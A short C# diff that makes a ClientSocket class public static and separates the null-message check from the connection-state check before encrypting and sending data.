@@ -17,7 +17,7 @@ using System.Text;
 
 namespace Client.Sockets
 {
-    class ClientSocket
+   public static class ClientSocket
     {
         public static Socket Client { get; set; }
         private static byte[] Buffer { get; set; }
@@ -147,11 +147,13 @@ namespace Client.Sockets
             {
                 try
                 {
-                    if (!Client.Connected || !IsConnected || msg == null)
+                    if (!Client.Connected || !IsConnected)
                     {
                         IsConnected = false;
                         return;
                     }
+
+                    if (msg == null) return;
 
                     byte[] buffer = Settings.aes256.Encrypt(msg);
                     byte[] buffersize = BitConverter.GetBytes(buffer.Length);
